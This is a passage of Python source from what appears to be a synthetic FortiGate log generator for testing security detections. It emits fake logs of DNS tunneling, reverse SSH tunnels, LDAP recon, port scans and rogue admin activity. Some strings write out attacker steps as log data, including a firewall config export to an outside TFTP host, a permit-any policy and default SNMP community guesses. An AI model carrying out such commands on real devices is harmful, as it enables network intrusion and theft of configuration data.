    dst_ip  = rand_ip_from_network(ip_network(dest.get("ip_range", "154.53.224.0/24"), strict=False))
    domain  = dest.get("domain", "bulk-file-host.com")
    geo     = _ext_geo()
    recv_mb = random.randint(500, 4000)

    logs = [_dns_precursor(config, src_ip, user, shost, domain, dst_ip)]
    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, domain, "6", 443, "accept",
        duration_s=random.randint(300, 2400), dst_country=geo["country"],
        dst_city=geo["city"], dst_region=geo["region"]
    )
    fields.update({
        "app":            "HTTPS",
        "in":             recv_mb * 1024 * 1024,
        "out":            random.randint(20000, 200000),
        "FTNTFGTrcvdpkt": random.randint(80000, 600000),
        "FTNTFGTapp":     "HTTPS.Download",
        "FTNTFGTappid":   40570,
        "FTNTFGTappcat":  "Cloud.Storage",
        "FTNTFGTapprisk": "high",
        "requestClientApplication": random.choice(_BROWSER_UA),
        "msg":            f"Large inbound transfer {recv_mb}MB from {domain}",
    })
    logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields))
    return logs


def _simulate_dns_tunneling(config, src_ip, user, shost):
    """
    High-volume DNS with long, high-entropy encoded labels to one resolver_ip — DNS
    tunneling / data-in-DNS exfil. Distinct from the beacon (recurrence-only): the
    signal here is query VOLUME + qname LENGTH + entropy + TXT/NULL data records.
    Stable resolver_ip+domain per source so the rare destination recurs across runs.
    """

    forti_conf = _get_config(config)
    domains    = forti_conf.get("dns_tunnel_domains",
                                ["t.exfil-tunnel.net", "dns.data-pipe.io", "ns.tunl-c2.com"])
    target = _dns_tunnel_target_map.get(src_ip)
    if not target:
        target = (_random_external_ip(), random.choice(domains))
        _dns_tunnel_target_map[src_ip] = target
    resolver_ip, tunnel_domain = target
    geo   = random.choice(_EXT_LOCATIONS)
    logs  = []
    for _ in range(random.randint(40, 90)):
        qname = f"{_b32_chunk(random.randint(32, 48))}.{_b32_chunk(random.randint(16, 32))}.{tunnel_domain}"
        qtype = random.choices(["TXT", "NULL", "A", "CNAME"], weights=[45, 25, 20, 10])[0]
        fields = {
            "src":              src_ip,
            "spt":              random.randint(49152, 65535),
            "shost":            shost,
            "suser":            user,
            "dst":              resolver_ip,
            "dpt":              53,
            "proto":            "17",
            "act":              "passthrough",
            "app":              "DNS",
            "FTNTFGTeventtype": "dns-query",
            "FTNTFGTqname":     qname,
            "FTNTFGTqtype":     qtype,
            "FTNTFGTqclass":    "IN",
            "FTNTFGTpolicyid":  forti_conf.get("default_policy_id", "1"),
            "FTNTFGTpolicyname": forti_conf.get("default_policy_name", "allow-outbound"),
            "FTNTFGTsrccountry":"Reserved",
            "FTNTFGTdstcountry": geo["country"],
            "FTNTFGTduration":  0,
            "out":              random.randint(180, 512),   # oversized encoded queries
            "in":               random.randint(200, 4000),  # large TXT/NULL answers
            "FTNTFGTsentpkt":   1,
            "FTNTFGTrcvdpkt":   random.randint(1, 4),
            "FTNTFGTosname":    random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":    _random_mac(shost),
            "FTNTFGTservice":   "DNS",
            "FTNTFGTlogdesc":   "DNS response",
            "FTNTFGTsrcintfrole": "lan",
            "FTNTFGTdstintfrole": "wan",
            "externalId":       _session_id(),
            "outcome":          "success",
            "msg":              f"DNS query for encoded label under {tunnel_domain}",
        }
        logs.append(_format_fortinet_cef(config, "1501054802", "dns", "dns-query", "warning", fields))
    return logs


def _simulate_reverse_ssh_tunnel(config, src_ip, user, shost):
    """
    Internal host establishing outbound SSH (22) to an EXTERNAL IP — reverse SSH
    tunnel / C2 over SSH. Long-lived, high bidirectional volume; a few sessions to
    the SAME external host show persistence.
    """
    # Recurring-access detectors need the SAME host on many days; a random pick among
    # ~500 users almost never repeats. One of a few fixed hosts (session_utils.recurring_host).
    try:
        from modules.session_utils import recurring_host
    except ImportError:
        from session_utils import recurring_host
    _h = recurring_host("fortinet_fortigate:reverse_ssh_tunnel")
    if _h:
        src_ip, user, shost = _h

    ext_ip = _beacon_target_map.get(f"revssh::{src_ip}") or rare_external_ip()
    _beacon_target_map[f"revssh::{src_ip}"] = ext_ip   # stable rare dest
    geo    = _ext_geo()
    logs   = []
    for _ in range(random.randint(2, 4)):
        fields = _base_traffic_fields(
            config, src_ip, shost, user, ext_ip, None, "6", 22, "accept",
            duration_s=random.randint(1800, 14400), dst_country=geo["country"],
            dst_city=geo["city"], dst_region=geo["region"]
        )
        fields.update({
            "app":            "SSH",
            "FTNTFGTapp":     "SSH",
            "FTNTFGTappid":   15895,
            "FTNTFGTappcat":  "Network.Service",
            "FTNTFGTapprisk": "high",
            "FTNTFGTservice": "SSH",
            "out":            random.randint(5, 80) * 1024 * 1024,
            "in":             random.randint(5, 80) * 1024 * 1024,
            "FTNTFGTsentpkt": random.randint(5000, 60000),
            "FTNTFGTrcvdpkt": random.randint(5000, 60000),
            "msg":            f"Outbound SSH session to external host {ext_ip}",
        })
        logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields))
    return logs


def _simulate_ldap_recon(config, src_ip, user, shost):
    """
    One host querying MANY domain controllers on LDAP 389/636 in a short window —
    AD reconnaissance (breadth + volume is the signal).
    """

    forti_conf = _get_config(config)
    lan_iface  = forti_conf.get("interface_lan", "port10")
    logs = []
    for dc in _get_domain_controllers(config):
        for _ in range(random.randint(3, 6)):
            port = random.choice([389, 389, 636])
            fields = _base_traffic_fields(
                config, src_ip, shost, user, dc, None, "6", port, "accept",
                duration_s=random.randint(1, 30), src_country="Reserved", dst_country="Reserved"
            )
            fields.update({
                "app":            "LDAP" if port == 389 else "LDAPS",
                "FTNTFGTapp":     "LDAP",
                "FTNTFGTappid":   16072,
                "FTNTFGTappcat":  "Network.Service",
                "FTNTFGTapprisk": "elevated",
                "FTNTFGTservice": "LDAP" if port == 389 else "LDAPS",
                "deviceInboundInterface":  lan_iface,
                "deviceOutboundInterface": lan_iface,
                "FTNTFGTdstintfrole": "lan",
                "out":            random.randint(2000, 40000),    # large search requests
                "in":             random.randint(20000, 400000),  # bulk directory results
                "msg":            f"LDAP query to domain controller {dc}",
            })
            logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields))
    return logs


def _simulate_vpn_abnormal_os(config, session_context=None):
    """
    Successful VPN login whose client OS differs from the user's normal device OS —
    'VPN access with an abnormal operating system'.
    """

    forti_conf = _get_config(config)
    gw_ip = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    if session_context:
        user_info = get_random_user(session_context, preferred_device_type="workstation")
        user = user_info["username"] if user_info else "jsmith"
    else:
        user = random.choice(["jsmith", "bjones", "mwilliams"])
    # From the user's OWN home IP, labelled with its real country (2026-09-17). This
    # previously used a random ambient IP and a random _ext_geo() country, so the login
    # was anomalous in location as well as OS; the detector should see ONLY the OS.
    ext_ip      = stable_vpn_ip(user, config)
    abnormal_os = random.choice(_ABNORMAL_VPN_OS)
    assign      = f"10.212.134.{random.randint(100, 200)}"
    fields = {
        "src": ext_ip, "dst": gw_ip, "dpt": 443, "proto": "6",
        "suser": user, "FTNTFGTxauthuser": user, "FTNTFGTxauthgroup": "VPN_Users",
        "FTNTFGTtunneltype": "ssl-vpn", "FTNTFGTvpntunnel": "SSL-VPN-Tunnel",
        "FTNTFGTremotegw": ext_ip,
        "FTNTFGTsrccountry": ip_country(ext_ip, config)[1] or "Reserved",
        "FTNTFGTosname": abnormal_os, "FTNTFGTosversion": abnormal_os,
        "FTNTFGTduration": 0, "FTNTFGTeventtime": int(time.time() * 1_000_000_000),
        "act": "tunnel-up", "outcome": "success",
        "FTNTFGTlogdesc": "SSL VPN tunnel up",
        "FTNTFGTtunnelid": random.randint(100000, 999999),
        "FTNTFGTtunnelip": assign, "FTNTFGTassignip": assign,
        "externalId": _session_id(),
        "msg": f"SSL VPN tunnel established for user {user} from {abnormal_os} client",
    }
    return [_format_fortinet_cef(config, "0101039424", "event", "vpn", "notice", fields)]


def _simulate_external_port_scan(config, attacker_ip=None):
    """
    External attacker IP scanning many ports on ONE internal host (inbound via WAN),
    denied by policy — external-facing port scan (complements the internal port_scan).
    A scenario pins attacker_ip so the scan joins its later steps.
    """
    ext_ip = attacker_ip or _random_external_ip()

    forti_conf = _get_config(config)
    wan_iface  = forti_conf.get("interface_wan", "port1")
    dst_ip     = random.choice(config.get("internal_servers", ["172.16.200.55"]))
    geo        = _ext_geo()
    ports      = random.sample(range(1, 10000), k=random.randint(40, 100))
    logs = []
    for port in ports:
        fields = {
            "src":                      ext_ip,
            "spt":                      random.randint(1024, 65535),
            "dst":                      dst_ip,
            # No resolved hostname for an IPS target — omit rather than echo the IP
        # (see the dhost note in _base_traffic_fields).
        "dhost":                    None,
            "dpt":                      port,
            "proto":                    "6",
            "act":                      "deny",
            "app":                      "UNKNOWN",
            "deviceInboundInterface":   wan_iface,
            "deviceOutboundInterface":  forti_conf.get("interface_lan", "port10"),
            "FTNTFGTpolicyid":          "0",
            "FTNTFGTpolicyname":        "implicit-deny",
            "FTNTFGTsrccountry":        geo["country"],
            "FTNTFGTdstcountry":        "Reserved",
            "FTNTFGTduration":          0,
            "out":                      0,
            "in":                       0,
            "FTNTFGTsentpkt":           1,
            "FTNTFGTrcvdpkt":           0,
            "FTNTFGTservice":           _port_to_service(port),
            "FTNTFGTlogdesc":           "Forward traffic denied",
            "FTNTFGTsrcintfrole":       "wan",
            "FTNTFGTdstintfrole":       "lan",
            "externalId":               _session_id(),
            "outcome":                  "failed",
            "reason":                   "no-policy-match",
            "msg":                      f"Denied inbound scan to port {port}",
        }
        logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields))
    return logs


def _generate_ldap_kerberos_benign(config, src_ip, user, shost):
    """Normal AD auth: workstation -> its DC on LDAP/Kerberos/SMB. Baseline traffic
    so LDAP recon and AD anomalies stand out. Returns a single log string."""
    forti_conf = _get_config(config)
    dc        = random.choice(_get_domain_controllers(config))
    lan_iface = forti_conf.get("interface_lan", "port10")
    port      = random.choice([389, 389, 636, 88, 88, 445])
    svc       = {389: "LDAP", 636: "LDAPS", 88: "Kerberos", 445: "SMB"}[port]
    fields = _base_traffic_fields(
        config, src_ip, shost, user, dc, None, "6", port, "accept",
        duration_s=random.randint(1, 20), src_country="Reserved", dst_country="Reserved"
    )
    fields.update({
        "app":            svc,
        "FTNTFGTservice": svc,
        "deviceInboundInterface":  lan_iface,
        "deviceOutboundInterface": lan_iface,
        "FTNTFGTdstintfrole": "lan",
        "out":            random.randint(500, 4000),
        "in":             random.randint(1000, 20000),
        "msg":            f"{svc} to domain controller {dc}",
    })
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


# Threat log dispatcher

def _generate_threat_log(config, session_context=None, forced_event=None, attacker_ip=None):
    """
    Dispatches a threat event based on event_mix.threat weights or hardcoded defaults.
    Multi-event generators (port_scan, auth_brute_force, etc.) return lists.
    If forced_event is given, that specific event is generated instead of a random pick.
    Returns (log_or_list, display_name).
    """
    forti_conf = _get_config(config)

    if forced_event:
        chosen = _DISPLAY_TO_EVENT.get(forced_event,
                 _DISPLAY_TO_EVENT.get(forced_event.lower(), forced_event.lower()))
    else:
        event_mix  = forti_conf.get("event_mix", {})
        threat_cfg = event_mix.get("threat", [])

        if threat_cfg:
            events  = [e["event"]  for e in threat_cfg]
            weights = [e["weight"] for e in threat_cfg]
        else:  # Fallback: use module-level defaults
            events  = [e["event"]  for e in _DEFAULT_THREAT_EVENTS]
            weights = [e["weight"] for e in _DEFAULT_THREAT_EVENTS]

        chosen = random.choices(events, weights=weights, k=1)[0]

    display_name = _EVENT_DISPLAY_NAMES.get(chosen, chosen)

    # --- Multi-event generators — return (list, display_name) ---
    if chosen == "port_scan":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_port_scan(config, user_info["ip"], user_info["username"], user_info.get("hostname")), display_name)
        return (_simulate_port_scan(config, "192.168.1.100", "unknown", None), display_name)

    if chosen == "auth_brute_force":
        return (_simulate_auth_brute_force(config), display_name)

    if chosen == "vpn_brute_force":
        return (_simulate_vpn_brute_force(config, session_context), display_name)

    if chosen == "vpn_password_spray":
        return (_simulate_vpn_password_spray(config, session_context), display_name)

    if chosen == "vpn_impossible_travel":
        return (_simulate_vpn_impossible_travel(config, session_context), display_name)

    if chosen == "vpn_tor_login":
        return (_simulate_vpn_tor_login(config, session_context), display_name)
    if chosen == "vpn_new_country_login":
        return (_simulate_vpn_new_country_login(config, session_context), display_name)

    if chosen == "lateral_movement":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_lateral_movement(config, user_info["ip"], user_info["username"],
                                              user_info.get("hostname")), display_name)
        src = random.choice(config.get("internal_servers", ["192.168.1.100"]))
        return (_simulate_lateral_movement(config, src, "unknown", None), display_name)

    if chosen == "dns_c2_beacon":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_dns_c2_beacon(config, user_info["ip"], user_info["username"], user_info.get("hostname")), display_name)
        return (_simulate_dns_c2_beacon(config, "192.168.1.100", "unknown", None), display_name)

    if chosen == "smb_new_host_lateral":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_smb_new_host_lateral(config, user_info["ip"], user_info["username"],
                                                   user_info.get("hostname"), session_context), display_name)
        return (_simulate_smb_new_host_lateral(config, "192.168.1.100", "unknown", None), display_name)

    if chosen == "smb_share_enumeration":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_smb_share_enumeration(config, user_info["ip"], user_info["username"],
                                                    user_info.get("hostname")), display_name)
        return (_simulate_smb_share_enumeration(config, "192.168.1.100", "unknown", None), display_name)

    if chosen == "smtp_spray":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_smtp_spray(config, user_info["ip"], user_info["username"],
                                          user_info.get("hostname")), display_name)
        return (_simulate_smtp_spray(config, "192.168.1.100", "unknown", None), display_name)

    if chosen == "ddns_connection":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_ddns_connection(config, user_info["ip"], user_info["username"],
                                              user_info.get("hostname")), display_name)
        return (_simulate_ddns_connection(config, "192.168.1.100", "unknown", None), display_name)

    if chosen == "dns_tunneling":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_dns_tunneling(config, user_info["ip"], user_info["username"], user_info.get("hostname")), display_name)
        return (_simulate_dns_tunneling(config, "192.168.1.100", "unknown", None), display_name)

    if chosen == "ldap_recon":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_ldap_recon(config, user_info["ip"], user_info["username"], user_info.get("hostname")), display_name)
        return (_simulate_ldap_recon(config, "192.168.1.100", "unknown", None), display_name)

    if chosen == "vpn_abnormal_os":
        return (_simulate_vpn_abnormal_os(config, session_context), display_name)

    if chosen == "external_port_scan":
        return (_simulate_external_port_scan(config, attacker_ip), display_name)

    if chosen == "new_admin_behavior":
        user_info = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        if user_info:
            return (_simulate_new_admin_behavior(config, user_info["ip"], user_info["username"],
                                                 user_info.get("hostname"), session_context), display_name)
        return (_simulate_new_admin_behavior(config, "192.168.1.100", "unknown", None, session_context), display_name)

    if chosen == "server_outbound_http":
        return (_simulate_server_outbound_http(config), display_name)

    # --- Management plane ---
    if chosen == "mgmt_admin_unexpected_source":
        return (_simulate_mgmt_admin_unexpected_source(config, session_context), display_name)
    if chosen == "mgmt_config_route_change":
        return (_simulate_mgmt_config_route_change(config, session_context), display_name)
    if chosen == "mgmt_logging_suppressed":
        return (_simulate_mgmt_logging_suppressed(config, session_context,
                                                  backdate=_MGMT_BACKDATE.get("on", False)), display_name)
    if chosen == "mgmt_config_harvest":
        return (_simulate_mgmt_config_harvest(config, session_context), display_name)
    if chosen == "snmp_unexpected_source":
        return (_simulate_snmp_unexpected_source(config, session_context), display_name)

    # --- Generators that now return lists (DNS precursor + event) ---
    # Resolve user/IP for user-attributed generators
    user, src_ip, shost = "unknown", "192.168.1.100", None
    if session_context:
        user_info = get_random_user(session_context, preferred_device_type="workstation")
        if user_info:
            user   = user_info["username"]
            src_ip = user_info["ip"]
            shost  = user_info.get("hostname")
    else:
        umap = (forti_conf.get("user_ip_map") or config.get('shared_user_ip_map', {}))
        if umap:
            user, src_ip = random.choice(list(umap.items()))
            shost = _get_user_and_host_info(config, src_ip)[1]

    if chosen == "tor_connection":
        return (_simulate_tor_connection(config, src_ip, user, shost), display_name)
    if chosen == "large_upload":
        return (_simulate_large_upload(config, src_ip, user, shost), display_name)
    if chosen == "large_upload_nonstd_port":
        try:
            from modules.session_utils import to_nonstandard_https
        except ImportError:
            from session_utils import to_nonstandard_https
        return (to_nonstandard_https(_simulate_large_upload(config, src_ip, user, shost)),
                display_name)
    if chosen == "rare_external_rdp":
        return (_simulate_rare_external_rdp(config, src_ip, user, shost), display_name)
    if chosen == "smtp_large_exfil":
        return (_simulate_smtp_large_exfil(config, src_ip, user, shost), display_name)
    if chosen == "ftp_large_exfil":
        return (_simulate_ftp_large_exfil(config, src_ip, user, shost), display_name)
    if chosen == "large_download":
        return (_simulate_large_download(config, src_ip, user, shost), display_name)
    if chosen == "reverse_ssh_tunnel":
        return (_simulate_reverse_ssh_tunnel(config, src_ip, user, shost), display_name)

    # --- Single-event generators ---
    if chosen == "ips":
        return (_simulate_ips_attack(config), display_name)
    elif chosen == "dos_anomaly":
        return (_simulate_dos_anomaly(config), display_name)
    elif chosen == "dlp_block":
        return (_simulate_dlp_block(config, src_ip, user, shost), display_name)
    elif chosen == "antivirus":
        return (_simulate_antivirus(config, src_ip, user, shost), display_name)
    elif chosen == "webfilter_block":
        return (_simulate_webfilter_block(config, src_ip, user, shost), display_name)
    elif chosen == "waf_attack":
        return (_simulate_waf_attack(config, None, None, None), display_name)
    elif chosen == "rdp_lateral":
        return (_simulate_rdp_lateral(config, src_ip, user, shost, session_context), display_name)
    elif chosen == "multi_dest_rdp":
        return (_simulate_multi_dest_rdp(config, src_ip, user, shost), display_name)
    elif chosen == "app_control_block":
        return (_simulate_app_control_block(config, src_ip, user, shost), display_name)
    elif chosen == "rare_domain_communication":
        return (_simulate_rare_domain_communication(config, src_ip, user, shost), display_name)
    elif chosen == "recurring_rare_domain":
        return (_simulate_recurring_rare_domain(
            config, src_ip, user, shost,
            domain=(context or {}).get("domain") if 'context' in dir() else None,
            dst_ip=(context or {}).get("dst_ip") if 'context' in dir() else None), display_name)
    elif chosen == "rare_appid_session":
        return (_simulate_rare_appid_session(config, src_ip, user, shost), display_name)
    elif chosen == "torrent_client":
        return (_simulate_torrent_client(config, src_ip, user, shost), display_name)
    elif chosen == "port_sweep":
        return (_simulate_port_sweep(config, src_ip, user, shost), display_name)
    elif chosen == "dc_smb_outbound":
        return (_simulate_dc_smb_outbound(config, src_ip, user, shost), display_name)
    elif chosen == "new_ftp_server":
        return (_simulate_new_ftp_server(config, src_ip, user, shost), display_name)
    elif chosen == "rare_appid":
        return (_simulate_rare_appid(config, src_ip, user, shost), display_name)
    elif chosen == "abnormal_rdp_rare_host":
        return (_simulate_abnormal_rdp_rare_host(config, src_ip, user, shost), display_name)
    elif chosen == "rare_smtp_session":
        return (_simulate_rare_smtp_session(config, src_ip, user, shost), display_name)
    elif chosen == "smb_rare_file_transfer":
        return (_simulate_smb_rare_file_transfer(config, src_ip, user, shost), display_name)
    else:
        return (_simulate_ips_attack(config), display_name)


# Management plane
#
# FortiOS 7.4.4 log IDs (Log Message Reference, "Log ID definitions"):
#   0100032001 LOG_ID_ADMIN_LOGIN_SUCC     0100032002 LOG_ID_ADMIN_LOGIN_FAIL
#   0100032003 LOG_ID_ADMIN_LOGOUT         0100032143 LOG_ID_BACKUP_CONF_BY_SCP
#   0100044546 LOGID_EVENT_CONFIG_ATTR     0100044547 LOGID_EVENT_CONFIG_OBJATTR
#   0100044548 LOGID_EVENT_CONFIG_EXEC     0100029021 LOG_ID_EVENT_AUTH_SNMP_QUERY_FAILED
# The FortiGate modeling rule maps cfgpath -> xdm.target.resource.type, cfgattr ->
# .resource.name, cfgobj -> .resource.value; the admin is `user`, which Fortinet's CEF
# mapping carries as duser (as the existing admin_event does).

def _fgt_mgmt_event(config, logid, level, ts, fields):
    return _format_fortinet_cef(config, logid, "event", "system", level, {
        "_no_user_qualify": True,          # local admin accounts, not AD identities
        "FTNTFGTeventtime": int(ts * 1_000_000_000),
        **fields})


def _fgt_admin_session(config, user, src, actions, method="ssh", start=None,
                       failures=0, gap=(2, 25), devname=None):
    """failures x 32002 -> 32001 login -> config/exec events -> 32003 logout.
    actions: list of (logid, fields) built by _fgt_cfg_attr / _fgt_cfg_exec."""
    forti_conf = _get_config(config)
    dst = (forti_conf.get("management_ip", "172.16.200.1")
           if src.startswith(("10.", "172.", "192.168."))
           else forti_conf.get("vpn_gateway_ip", "203.0.113.20"))
    ui = f"{method}({src})"
    t = start or time.time() - (len(actions) + 3) * gap[1]
    base = {"duser": user, "src": src, "dst": dst, "FTNTFGTui": ui, "FTNTFGTmethod": method}
    if devname:   # a peer FortiGate: its own name and serial
        serial = forti_conf.get("serial_number", "FGVM08TM21000001")
        base["dvchost"] = devname
        base["deviceExternalId"] = serial[:-4] + hashlib.sha1(devname.encode()).hexdigest()[:4].upper()
    out = []
    for _ in range(failures):
        out.append(_fgt_mgmt_event(config, "0100032002", "alert", t, {
            **base, "act": "login", "outcome": "failed", "reason": "passwd_invalid",
            "FTNTFGTlogdesc": "Admin login failed",
            "msg": f"Administrator {user} login failed from {ui} because of invalid password"}))
        t += random.randint(2, 6)
    out.append(_fgt_mgmt_event(config, "0100032001", "information", t, {
        **base, "act": "login", "outcome": "success", "FTNTFGTlogdesc": "Admin login successful",
        "msg": f"Administrator {user} logged in successfully from {ui}"}))
    login_t = t
    for logid, f in actions:
        t += random.randint(*gap)
        out.append(_fgt_mgmt_event(config, logid, "information", t, {**base, **f}))
    t += random.randint(*gap)
    out.append(_fgt_mgmt_event(config, "0100032003", "information", t, {
        **base, "act": "logout", "outcome": "success", "FTNTFGTlogdesc": "Admin logout successful",
        "FTNTFGTduration": int(t - login_t),
        "msg": f"Administrator {user} timed out on {ui}" if random.random() < 0.2
               else f"Administrator {user} logged out from {ui}"}))
    return out


def _fgt_cfg_attr(path, attr, act="Edit", obj=None):
    f = {"act": act, "FTNTFGTcfgtid": random.randint(1000000, 9999999), "FTNTFGTcfgpath": path,
         "FTNTFGTcfgattr": attr}
    if obj is not None:
        f.update({"FTNTFGTcfgobj": str(obj), "FTNTFGTlogdesc": "Object attribute configured",
                  "msg": f"{act} {path} {obj}"})
        return ("0100044547", f)
    f.update({"FTNTFGTlogdesc": "Attribute configured", "msg": f"{act} {path}"})
    return ("0100044546", f)


def _fgt_cfg_exec(command):
    return ("0100044548", {"act": "Execute", "FTNTFGTcfgpath": "execute",
                           "FTNTFGTlogdesc": "Configuration executed", "msg": command})


_FGT_ROUTINE_CHANGES = [
    lambda n: _fgt_cfg_attr("firewall.address", f"subnet[10.0.10.{n} 255.255.255.255]",
                            act="Add", obj=f"SRV-WEB-{n}"),
    lambda n: _fgt_cfg_attr("firewall.policy", f"comments[CHG{n} patch window]", obj=str(n % 40 + 1)),
    lambda n: _fgt_cfg_attr("firewall.addrgrp", f"member[SRV-WEB-{n}]", obj="GRP-PATCH-SRV"),
]


def _simulate_mgmt_admin_session(config, session_context=None):
    """BENIGN: a network admin from the NOC jump host; one session in five changes
    something routine. Status checks leave only the login/logout pair, as on a real
    FortiGate (show/get commands are not logged)."""
    user, src = mgmt_plane.admin_user(config), mgmt_plane.admin_source(config)
    acts = []
    if random.random() < 0.2:
        n = random.randint(20, 240)
        acts = [random.choice(_FGT_ROUTINE_CHANGES)(n)]
    return _fgt_admin_session(config, user, src, acts, method=random.choice(["ssh", "https"]))


def _simulate_mgmt_config_backup(config, session_context=None):
    """BENIGN: the nightly backup job pulls the config over SCP."""
    host, acct = mgmt_plane.backup(config)
    return [_fgt_mgmt_event(config, "0100032143", "information", time.time(), {
        "duser": acct, "src": host, "dst": _get_config(config).get("management_ip", "172.16.200.1"),
        "FTNTFGTui": f"ssh({host})", "act": "backup", "outcome": "success",
        "FTNTFGTlogdesc": "Configuration backed up by SCP",
        "msg": f"System config file has been downloaded by user {acct} via SCP"})]


def _simulate_snmp_poll(config, session_context=None):
    """BENIGN: the monitoring poller reads SNMP from infrastructure behind the FortiGate."""
    poller = mgmt_plane.snmp_poller(config)
    dev = random.choice(mgmt_plane.network_devices(config))
    fields = _base_traffic_fields(config, poller, None, None, dev, None, "17", 161, "accept",
                                  duration_s=random.randint(0, 2))
    fields.update({"app": "SNMP", "FTNTFGTapp": "SNMP", "FTNTFGTappcat": "Network.Service",
                   "FTNTFGTservice": "SNMP", "out": random.randint(80, 300),
                   "in": random.randint(200, 1500), "msg": "SNMP poll"})
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


def _simulate_mgmt_admin_unexpected_source(config, session_context=None):
    """THREAT device-admin-from-unexpected-source (see cisco_asa for the pattern)."""
    src, kind = mgmt_plane.unexpected_source(config, session_context)
    user = mgmt_plane.admin_user(config)

    return _fgt_admin_session(config, user, src, [], method=random.choice(["ssh", "https"]),
                              failures=random.randint(0, 2))


def _simulate_mgmt_config_route_change(config, session_context=None):
    """THREAT network-device-config-or-route-change: rogue static route, permit-any
    policy and an IPsec tunnel to an attacker-controlled peer."""
    src, kind = (mgmt_plane.unexpected_source(config, session_context)
                 if random.random() < 0.6 else (mgmt_plane.admin_source(config), "admin-subnet"))
    user, rogue = mgmt_plane.admin_user(config), rare_external_ip()
    wan = _get_config(config).get("interface_wan", "port1")

    acts = [
        _fgt_cfg_attr("router.static", f"gateway[{rogue}]dst[10.0.10.0 255.255.255.0]device[{wan}]",
                      act="Add", obj=str(random.randint(20, 90))),
        _fgt_cfg_attr("firewall.policy", "srcaddr[all]dstaddr[all]action[accept]service[ALL]",
                      act="Add", obj=str(random.randint(900, 990))),
        _fgt_cfg_attr("vpn.ipsec.phase1-interface", f"remote-gw[{rogue}]interface[{wan}]",
                      act="Add", obj="sync-tun"),
    ]
    return _fgt_admin_session(config, user, src, acts, method="ssh")


_FGT_SUPPRESS_KEY = "fortinet_fortigate"
_MGMT_BACKDATE = {"on": False}   # set by generate_log for an on-demand fire (harness)


def _fgt_logging_toggle(config, user, src, ts, enable):
    old, new = ("disable", "enable") if enable else ("enable", "disable")
    forti_conf = _get_config(config)
    return _fgt_mgmt_event(config, "0100044546", "information", ts, {
        "duser": user, "src": src, "dst": forti_conf.get("management_ip", "172.16.200.1"),
        "FTNTFGTui": f"ssh({src})", **_fgt_cfg_attr("log.syslogd.setting",
                                                     f"status[{old}->{new}]")[1]})


def _simulate_mgmt_logging_suppressed(config, session_context=None, backdate=False):
    """THREAT network-device-logging-suppressed-for-a-window: syslog forwarding set to
    disable, silence, then re-enabled (see cisco_asa for the window mechanics)."""
    user = mgmt_plane.admin_user(config)
    src, _ = (mgmt_plane.unexpected_source(config, session_context)
              if random.random() < 0.5 else (mgmt_plane.admin_source(config), "admin-subnet"))
    window = mgmt_plane.suppression_window_seconds()
    now = time.time()

    start = now - window - 60 if backdate else now - 40
    off = _fgt_admin_session(config, user, src, [], method="ssh", start=start)[:-1]  # no logout yet
    off.append(_fgt_logging_toggle(config, user, src, start + 30, enable=False))
    if backdate:
        return off + [_fgt_logging_toggle(config, user, src, now, enable=True)]
    mgmt_plane.open_suppression(_FGT_SUPPRESS_KEY, window, user, src)
    return off


def _simulate_mgmt_config_harvest(config, session_context=None):
    """THREAT scripted-device-config-harvesting: one source, several FortiGates, a few
    seconds each, every session exporting the full config to an outside TFTP server."""
    src, kind = (mgmt_plane.unexpected_source(config, session_context)
                 if random.random() < 0.5 else (random.choice(mgmt_plane.conf(config)["jump_hosts"]), "jump-host"))
    user, drop = mgmt_plane.admin_user(config), rare_external_ip()
    devices = mgmt_plane.sibling_hostnames(_get_config(config).get("hostname", "FG-FW-01"),
                                           random.randint(3, 5))

    t, out = time.time() - 75 * len(devices), []
    for dev in devices:
        out += _fgt_admin_session(config, user, src,
                                  [_fgt_cfg_exec(f"execute backup full-config tftp {dev.lower()}.conf {drop}")],
                                  method="ssh", start=t, gap=(1, 3), devname=dev)
        t += random.randint(15, 60)
    return out


def _simulate_snmp_unexpected_source(config, session_context=None):
    """THREAT snmp-from-unexpected-source: a workstation walks every network device on
    UDP/161, and its guesses at the FortiGate's own community string fail."""
    ui = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
    src, user, shost = (ui["ip"], ui["username"], ui.get("hostname")) if ui else ("192.168.1.100", None, None)

    t, out = time.time() - 60, []
    for dev in mgmt_plane.network_devices(config):
        f = _base_traffic_fields(config, src, shost, user, dev, None, "17", 161, "accept",
                                 duration_s=random.randint(0, 3))
        f.update({"app": "SNMP", "FTNTFGTapp": "SNMP", "FTNTFGTappcat": "Network.Service",
                  "FTNTFGTservice": "SNMP", "out": random.randint(60, 200),
                  "in": random.randint(800, 40000), "FTNTFGTeventtime": int(t * 1_000_000_000),
                  "msg": "SNMP request"})
        out.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", f))
        t += random.randint(1, 4)
    for community in ("public", "private", "cisco"):
        out.append(_fgt_mgmt_event(config, "0100029021", "warning", t, {
            "src": src, "dst": _get_config(config).get("management_ip", "172.16.200.1"),
            "dpt": 161, "act": "snmp-query", "outcome": "failed",
            "FTNTFGTlogdesc": "SNMP query failed",
            "msg": f"SNMP query failed from {src}: community '{community}' not configured"}))
        t += 1
    return out


